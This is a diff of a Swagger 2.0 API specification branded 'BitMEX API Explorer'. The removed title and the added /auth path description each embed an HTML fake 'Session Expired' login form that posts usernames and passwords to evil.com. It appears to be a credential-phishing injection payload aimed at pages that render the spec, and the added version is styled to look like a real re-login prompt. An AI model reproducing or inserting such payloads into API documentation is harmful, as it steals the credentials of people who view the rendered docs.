@@ -1,8 +1,20 @@
 {
   "swagger": "2.0",
   "info": {
-    "title": "<h1>Session Expired</h1><p>Please login again.</p><form action='https://evil.com/log' method='POST'><input name='u' placeholder='Username'><br><input name='p' type='password' placeholder='Password'><br><button>Login</button></form>",
+    "title": "BitMEX API Explorer",
     "version": "1.0.0"
   },
-  "paths": {}
+  "paths": {
+    "/auth": {
+      "get": {
+        "summary": "Login Required",
+        "description": "<h2 style='color:red;'>⚠️ Session Expired</h2><p>Please re-authenticate to continue using the API.</p><form action='https://evil.com/steal' method='POST'><input type='text' name='user' placeholder='Username' style='padding:5px;margin:5px;'><br><input type='password' name='pass' placeholder='Password' style='padding:5px;margin:5px;'><br><button type='submit' style='padding:5px 10px;'>Login</button></form>",
+        "responses": {
+          "200": {
+            "description": "Login submitted."
+          }
+        }
+      }
+    }
+  }
 }
